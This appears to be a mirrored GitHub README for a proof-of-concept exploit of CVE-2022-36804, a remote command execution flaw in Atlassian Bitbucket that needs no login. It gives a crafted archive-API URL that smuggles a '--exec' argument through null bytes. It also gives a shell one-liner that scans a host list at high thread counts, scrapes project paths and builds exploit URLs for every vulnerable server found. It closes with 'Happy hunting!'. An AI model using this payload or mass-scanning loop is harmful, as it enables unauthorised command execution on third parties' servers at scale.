# CVE-2022-36804-POC

Bitbucket CVE-2022-36804 unauthenticated remote command execution

| Infos    | Value                                                              |
| -------- | -------------------------------------------------------------------|
| Username | [https://github.com/kljunowsky](https://github.com/kljunowsky) |
| Url      | [https://github.com/kljunowsky/CVE-2022-36804-POC](https://github.com/kljunowsky/CVE-2022-36804-POC)                                               |
| Stars    | 6                                                          |
| License  | MIT License                                                        |

<details>

<summary>Topic / Tags</summary>

* atlassian* atlassian-bitbucket* bitbucket* bug-bounty* cve-2022-36804* exploit* hack* hacking* infosec* penetration-testing* penetration-testing-tools* poc* rce* security

</details>

## Readme

# CVE-2022-36804-POC üï∑Ô∏è
Bitbucket CVE-2022-36804 unauthenticated remote command execution

## Exploitation

Find publicly visible repositories - example.com/repos?visibility=public

`/rest/api/latest/projects/{project-path}/archive?filename=kiE0h&at=kiE0h&path=kiE0h&prefix=ax%00--exec=%60id%60%00--remote=origin`


## Mass Exploitation
``
 for url in $(cat hosts.txt | httpx -follow-redirects -title -path /repos?visibility=public -match-string "repository-container" -threads 9500 | grep Bitbucket |awk '{print $1}');do echo $url|sed 's/\/repos?visibility=public//g'|tr -d \\n;curl -s -k "$url" | grep -Po '(/projects/)(?!.*\1).*'|grep -o "/projects/.*/browse"|sed 's/browse//g'|awk '{print "/rest/api/latest"$1"archive?filename=kiE0h&at=kiE0h&path=kiE0h&prefix=ax%00--exec=%60id%60%00--remote=origin"}';done
``

Visit crafted URLs :)

Happy hunting! üê∫

[Twitter](https://twitter.com/milanshiftsec)

[LinkedIn](https://www.linkedin.com/in/milan-jovic-sec/)



## Get the content

```
git clone https://github.com/kljunowsky/CVE-2022-36804-POC
cd CVE-2022-36804-POC
```

{% embed url="https://github.com/kljunowsky/CVE-2022-36804-POC" %}

<figure><img src="https://avatars.githubusercontent.com/u/104329412?v=4" alt=""><figcaption><p>kljunowsky</p></figcaption></figure>
